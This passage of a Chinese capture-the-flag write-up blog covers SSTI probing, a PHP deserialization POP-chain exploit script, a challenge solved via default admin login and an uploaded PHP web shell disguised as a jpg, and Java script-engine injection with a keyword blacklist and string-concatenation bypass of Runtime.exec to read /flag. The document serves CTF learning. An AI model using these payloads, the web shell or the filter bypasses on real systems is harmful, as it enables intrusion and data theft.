class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当服务器处理这个页面时，它会看到 {{ ... }}，就知道这里需要一个变量。它会找到当前登录的用户名（比如“小明”），然后把这个“空”填上，最终生成一个完整的 HTML 发送给用户的浏览器：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>欢迎你，小明！<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这个过程就叫做 服务器端模板渲染。</p><hr><p>探测是否存在 SSTI:</p><p>不同的模板引擎语法略有不同，你也可以试试 :</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% raw %&#125;&#123;&#123; 7*7 &#125;&#125;&#123;% endraw %&#125;， &#123;$ 7*7 $&#125;， &lt;%= 7*7 %&gt;</span><br></pre></td></tr></table></figure><p>一个常见的方法是使用一个会报错的 payload，从错误信息中判断</p><p>输入： {{ “” }}</p><p>观察错误信息： 如果错误信息里提到了 “Jinja2”，那很可能就是 Python 的 Jinja2 引擎。如果提到了 “Twig”，可能就是 PHP 的 Twig。</p><h1 id="Week4"><a href="#Week4" class="headerlink" title="Week4"></a>Week4</h1><h2 id="小羊走迷宫"><a href="#小羊走迷宫" class="headerlink" title="小羊走迷宫"></a>小羊走迷宫</h2><img src="1075cc9df96a2e894e380357af969f8f.png" alt="1075cc9df96a2e894e380357af969f8f.png"  /><img src="30ac3f125be28631ecaa57dd7132fb16.png" alt="30ac3f125be28631ecaa57dd7132fb16.png"  /><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">startPoint</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$direction</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;gogogo出发咯 &quot;</span>;</span><br><span class="line">        <span class="variable">$way</span> = <span class="variable language_">$this</span>-&gt;direction;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$way</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Treasure</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$door</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$chest</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;拿到钥匙咯，开门！ &quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; door -&gt; <span class="title function_ invoke__">open</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;小羊真可爱! &quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt; chest -&gt; key;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SaySomething</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;说点什么呢 &quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;说： &quot;</span>.<span class="variable language_">$this</span>-&gt;sth;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">endPoint</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$path</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;到达终点！现在尝试获取flag吧&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;ma_ze.path&quot;</span>])&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ma_ze.path&quot;</span>]));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;这个变量名有点奇怪，要怎么传参呢？&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>      </span><br></pre></td></tr></table></figure><h3 id="PHP中关于非法参数名传参问题"><a href="#PHP中关于非法参数名传参问题" class="headerlink" title="PHP中关于非法参数名传参问题"></a>PHP中关于非法参数名传参问题</h3><p>可以看見</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;ma_ze.path&quot;</span>])&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ma_ze.path&quot;</span>]));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;这个变量名有点奇怪，要怎么传参呢？&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GET傳參  unserialize(base64_decode($_GET[“ma_ze.path”]));</p><p><a href="https://blog.csdn.net/mochu7777777/article/details/115050295">https://blog.csdn.net/mochu7777777/article/details/115050295</a></p><p>第一關 get 參數, Payload如下：</p><p>?mo[chu.7&#x3D;xxx</p><h3 id="POP鏈"><a href="#POP鏈" class="headerlink" title="POP鏈"></a>POP鏈</h3><p>先找入口出口 , __wakeup() , 首先会调用startPoint的__wakeup，因为它有__wakeup方法</p><p>public $direction;</p><p>public $sth;</p><p>只有這兩個可用的變量 </p><p>其他都是protected 和 private</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> (Treasure类的$door和$door和door和</span><br><span class="line">door和chest属性是protected的，不能直接访问。</span><br><span class="line">我们需要使用反射或者手动构造序列化字符串)</span><br></pre></td></tr></table></figure><p>我們來POP链构造:</p><p>start-&gt;direction&#x3D;say</p><p>say-&gt;sth &#x3D; t2</p><p>t2……</p><p>t1…..</p><p>end……</p><p>的反轉</p><p>省流php代碼:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">startPoint</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$direction</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SaySomething</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Treasure</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$door</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$chest</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">endPoint</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$path</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建对象</span></span><br><span class="line"><span class="variable">$endpoint</span> = <span class="keyword">new</span> <span class="title function_ invoke__">endPoint</span>();</span><br><span class="line"><span class="variable">$treasure1</span> = <span class="keyword">new</span> <span class="title class_">Treasure</span>();</span><br><span class="line"><span class="variable">$treasure2</span> = <span class="keyword">new</span> <span class="title class_">Treasure</span>();</span><br><span class="line"><span class="variable">$say</span> = <span class="keyword">new</span> <span class="title class_">SaySomething</span>();</span><br><span class="line"><span class="variable">$start</span> = <span class="keyword">new</span> <span class="title function_ invoke__">startPoint</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用反射设置private和protected属性</span></span><br><span class="line"><span class="variable">$reflection</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="variable">$endpoint</span>);</span><br><span class="line"><span class="variable">$property</span> = <span class="variable">$reflection</span>-&gt;<span class="title function_ invoke__">getProperty</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="variable">$property</span>-&gt;<span class="title function_ invoke__">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$property</span>-&gt;<span class="title function_ invoke__">setValue</span>(<span class="variable">$endpoint</span>, <span class="string">&quot;./flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$reflectionTreasure</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="variable">$treasure1</span>);</span><br><span class="line"><span class="variable">$propertyDoor</span> = <span class="variable">$reflectionTreasure</span>-&gt;<span class="title function_ invoke__">getProperty</span>(<span class="string">&#x27;door&#x27;</span>);</span><br><span class="line"><span class="variable">$propertyDoor</span>-&gt;<span class="title function_ invoke__">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$propertyDoor</span>-&gt;<span class="title function_ invoke__">setValue</span>(<span class="variable">$treasure1</span>, <span class="variable">$endpoint</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$propertyChest</span> = <span class="variable">$reflectionTreasure</span>-&gt;<span class="title function_ invoke__">getProperty</span>(<span class="string">&#x27;chest&#x27;</span>);</span><br><span class="line"><span class="variable">$propertyChest</span>-&gt;<span class="title function_ invoke__">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$propertyChest</span>-&gt;<span class="title function_ invoke__">setValue</span>(<span class="variable">$treasure2</span>, <span class="variable">$treasure1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构建利用链</span></span><br><span class="line"><span class="variable">$say</span>-&gt;sth = <span class="variable">$treasure2</span>;</span><br><span class="line"><span class="variable">$start</span>-&gt;direction = <span class="variable">$say</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$start</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Payload: &quot;</span> . <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$payload</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;URL: ?ma_ze.path=&quot;</span> . <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$payload</span>)) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>可以先試試 say  “i am gay” , 看看 start 能不能echo “说点什么呢 “. “说： “.”i am gay” </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">startPoint</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$direction</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SaySomething</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Treasure</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$door</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$chest</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">endPoint</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$path</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">startPoint</span>() ;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SaySomething</span>() ;</span><br><span class="line"><span class="variable">$b</span>-&gt;sth =  <span class="string">&quot;i am gay &quot;</span> ;</span><br><span class="line"><span class="variable">$a</span>-&gt;direction = <span class="variable">$b</span> ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>TzoxMDoic3RhcnRQb2ludCI6MTp7czo5OiJkaXJlY3Rpb24iO086MTI6IlNheVNvbWV0aGluZyI6MTp7czozOiJzdGgiO3M6OToiaSBhbSBnYXkgIjt9fQ%3D%3D</p><img src="8e51236fc846dbb73724e589eb64e8bb.png" alt="8e51236fc846dbb73724e589eb64e8bb.png"  /><p>看來沒有打印 , 可以看見say函數是return $this-&gt;sth ;</p><p>我應該要令它&#x3D; t2 , </p><p>t2-&gt;chest &#x3D; t1;</p><p>t1-&gt;door &#x3D; end </p><p>end -&gt; path &#x3D; “.&#x2F;flag.php”</p><p>所以大概是這樣子的:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$end</span> = <span class="keyword">new</span> <span class="title function_ invoke__">endPoint</span>();      </span><br><span class="line"><span class="variable">$t1</span> = <span class="keyword">new</span> <span class="title class_">Treasure</span>();        </span><br><span class="line"><span class="variable">$t2</span> = <span class="keyword">new</span> <span class="title class_">Treasure</span>();       </span><br><span class="line"><span class="variable">$say</span> = <span class="keyword">new</span> <span class="title class_">SaySomething</span>();  </span><br><span class="line"><span class="variable">$start</span> = <span class="keyword">new</span> <span class="title function_ invoke__">startPoint</span>();  </span><br><span class="line"></span><br><span class="line"><span class="variable">$end</span>-&gt;path = <span class="string">&quot;./flag.php&quot;</span>;  </span><br><span class="line"></span><br><span class="line"><span class="variable">$t1</span>-&gt;door = <span class="variable">$end</span>;    </span><br><span class="line"><span class="variable">$t2</span>-&gt;chest = <span class="variable">$t1</span>;    </span><br><span class="line"></span><br><span class="line"><span class="variable">$say</span>-&gt;sth = <span class="variable">$t2</span>;           </span><br><span class="line"><span class="variable">$start</span>-&gt;direction = <span class="variable">$say</span>; </span><br></pre></td></tr></table></figure><p>但是有一個問題t1 t2 end 不是public 的参數 , 此時我們需要反射或者手动构造序列化字符串</p><img src="b4529bea14119d9aee7d9fe1bafbe336.png" alt="b4529bea14119d9aee7d9fe1bafbe336.png"  /><p>deepseek給了一個例子了 , 抄它的了 , 把變量名字寫清楚如上 , 最後flag在回應裹。</p><h2 id="武功秘籍"><a href="#武功秘籍" class="headerlink" title="武功秘籍"></a>武功秘籍</h2><p>dirsearch一下:</p><img src="8f10990a9af18e11530e48cd45ffc406.png" alt="8f10990a9af18e11530e48cd45ffc406.png"  /><p>發現admin admin 能登入 , 有一個上傳文件的地方 :</p><img src="a3fc7ed21d05885e0b147d2b7374f6d9.png" alt="a3fc7ed21d05885e0b147d2b7374f6d9.png"  /><p>看看BP抓包能不恃能修改:</p><img src="413a12393c875218bb68f4830713093f.png" alt="413a12393c875218bb68f4830713093f.png"  /><br/><p>Content-Type:  application&#x2F;octet-stream是不能上傳的, 這裹先把它改成text&#x2F;plain</p><p>把文件改成tpl.config , 成功上傳</p><img src="8e7db669d8659287335a13162c55f2c9.png" alt="8e7db669d8659287335a13162c55f2c9.png"  /><p>url&#x2F;dcr&#x2F;tpl_import_action.php  </p><img src="ab917802402e2124a50e2874ff1c6e54.png" alt="ab917802402e2124a50e2874ff1c6e54.png"  /><p>還有在新闻中心發現可以上傳文件</p><p>先添加分类 1234</p><img src="9be13db9188438c13f0a46b7a220dc3e.png" alt="9be13db9188438c13f0a46b7a220dc3e.png"  /><p>添加新闻 , 選擇jpg的payload , payload如下 , 然後改成jpg檔 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = (<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="5727924543e78ea9ea44e2fd1979c340.png" alt="5727924543e78ea9ea44e2fd1979c340.png"  /><p>最後在文件管理器&#x2F;upload&#x2F;new&#x2F;….&#x2F;找到jpg檔把它重新命名為php檔:</p><p>成功fuzz了!!!!!!</p><img src="652dd9e90452a14545c289bf3bf0aa7e.png" alt="652dd9e90452a14545c289bf3bf0aa7e.png"  /><h2 id="ssti在哪里？-味复刻"><a href="#ssti在哪里？-味复刻" class="headerlink" title="ssti在哪里？(味复刻)"></a>ssti在哪里？(味复刻)</h2><br/><p><a href="https://blog.csdn.net/qq_43409582/article/details/90784223">https://blog.csdn.net/qq_43409582/article/details/90784223</a></p><h1 id="Week5"><a href="#Week5" class="headerlink" title="Week5"></a>Week5</h1><p>眼熟的计算器</p><p>這是一個用java寫的計算器 , 看看jar , 改成zip 解壓:<br><img src="54e354a5b18afc73ddc5dfbc10ee4840.png" alt="8f6c4313-0246-4426-a428-9f88e1e6c709.png"  /></p><p>用jadx打開 , 可以找到:</p><img src="9260cfc845b572e57790f58a6c8bbdde.png" alt="0ad708e8-7dc9-4ce2-b141-c7c635512923.png"  /><img src="039db0209c289b489b787470a7209c84.png" alt="75f72059-3571-46fb-a8d5-c2d17c5925ec.png"  /><p>測試一下 java可不可以注入:</p><p>Java.type(‘java.lang.String’)</p><img src="f3c76396a1116751e41d1ff069dc2a6e.png" alt="70542e50-c298-43d4-8197-f1c29e4db672.png"  /><p>測試全局對象:</p><ul><li>Object.keys(this)</li><li>Object.getOwnPropertyNames(this)</li></ul><p>測試內置對象:</p><ul><li>Math.PI</li><li>new Date().toString()</li><li>JSON.stringify({test: 123})</li></ul><p>字符串操作:</p><ul><li>‘hello’.length</li><li>‘hello’ + ‘ world’</li></ul><p>數組操作:</p><ul><li>[1,2,3].join(‘-‘)</li></ul><p>函數操作:</p><ul><li>(function(){return 123})()</li></ul><p>測試eval和Function:</p><ul><li>eval(‘1+1’)</li><li>Function(‘return 789’)()</li></ul><p>編碼函數:</p><ul><li>btoa(‘hello’)</li><li>atob(‘aGVsbG8&#x3D;’)</li><li>encodeURI(‘hello world’)</li><li>decodeURI(‘hello%20world’)</li></ul><p>原型鏈:</p><ul><li>Object.prototype</li><li>Object.constructor</li></ul><p>特殊對象:</p><ul><li>arguments</li><li>this</li></ul><p>環境變量:</p><ul><li>process &amp;&amp; process.env</li><li>global</li></ul><p>Node.js對象:</p><ul><li>typeof require</li><li>module</li><li>exports</li></ul><p>用ai生成黑名單關鍵字爆破:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">javascript</span><br><span class="line">java</span><br><span class="line">lang</span><br><span class="line">Runtime</span><br><span class="line">getRuntime</span><br><span class="line">exec</span><br><span class="line">ProcessBuilder</span><br><span class="line">start</span><br><span class="line">Class</span><br><span class="line">forName</span><br><span class="line">getMethod</span><br><span class="line">invoke</span><br><span class="line">System</span><br><span class="line">getProperty</span><br><span class="line">getenv</span><br><span class="line">File</span><br><span class="line">Scanner</span><br><span class="line">BufferedReader</span><br><span class="line">FileReader</span><br><span class="line">InputStream</span><br><span class="line">OutputStream</span><br><span class="line">read</span><br><span class="line">write</span><br><span class="line">reflect</span><br><span class="line">Method</span><br><span class="line">Field</span><br><span class="line">Constructor</span><br><span class="line">cmd</span><br><span class="line">sh</span><br><span class="line">bash</span><br><span class="line">powershell</span><br><span class="line">command</span><br><span class="line">cat</span><br><span class="line">flag</span><br><span class="line">ls</span><br><span class="line">pwd</span><br><span class="line">whoami</span><br><span class="line">id</span><br><span class="line">eval</span><br><span class="line">Function</span><br><span class="line">setTimeout</span><br><span class="line">setInterval</span><br><span class="line">decodeURI</span><br><span class="line">decodeURIComponent</span><br><span class="line">atob</span><br><span class="line">btoa</span><br><span class="line">String</span><br><span class="line">fromCharCode</span><br><span class="line">charCodeAt</span><br><span class="line">import</span><br><span class="line">require</span><br><span class="line">include</span><br><span class="line">load</span><br><span class="line">window</span><br><span class="line">document</span><br><span class="line">location</span><br><span class="line">navigator</span><br><span class="line">this</span><br><span class="line">global</span><br><span class="line">self</span><br><span class="line">top</span><br><span class="line">.</span><br><span class="line">(</span><br><span class="line">)</span><br><span class="line">[</span><br><span class="line">]</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#x27;</span><br><span class="line">&quot;</span><br><span class="line">`</span><br><span class="line">$</span><br><span class="line">&amp;</span><br><span class="line">*</span><br><span class="line">+</span><br><span class="line">-</span><br><span class="line">/</span><br><span class="line">\</span><br><span class="line">|</span><br></pre></td></tr></table></figure><img src="b443d4edd524037863cedc037136a3d7.png" alt="5f3f2d03-cc30-493f-92f9-b96035b4376c.png"  /><br/><p>測試JavaScript全局對象:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攔截: `Runtime`, `ProcessBuilder`, `exec()`, `start()`, 反射方法</span><br></pre></td></tr></table></figure><img src="536992c6825492585c80fbcd8a7a065f.png" alt="743079df-5d15-4ad7-b75d-9ca415a0485a.png"  /><img src="487e9930d841914ed2554b0675d66b3f.png" alt="22957f1d-7cec-4476-9336-83d325f0c36a.png"  /><h3 id="用字符串拼接"><a href="#用字符串拼接" class="headerlink" title="用字符串拼接"></a>用字符串拼接</h3><p>eval 是 200 : val(‘jav’ + ‘a.lang.Runt’ + ‘ime.getRunt’ + ‘ime().exec(“ls”)’)</p><img src="5d11b655aa8f4c96bbede02896bc7e47.png" alt="ddcf7a8e-108a-459c-add3-87bca89e8c7b.png"  /><p>點號組合好像是沒有問題的</p><p>java . lang</p><p>使用Java的Files.readAllLines()方法成功讀取了flag文件:</p><p>Files類的特殊性:</p><ul><li><code>java.nio.file.Files</code> 是Java 7引入的新API</li><li>主要用於文件操作，不是典型的命令執行類</li><li>方法名 <code>readAllLines</code> 看起來像是安全的文件讀取操作</li></ul><p>java.nio.file.Files.readAllLines(java.nio.file.Paths.get(‘&#x2F;flag’)).get(0)</p><h2 id="废弃的网站"><a href="#废弃的网站" class="headerlink" title="废弃的网站"></a>废弃的网站</h2><p>先看看条件竞争這個概念：</p><p><a 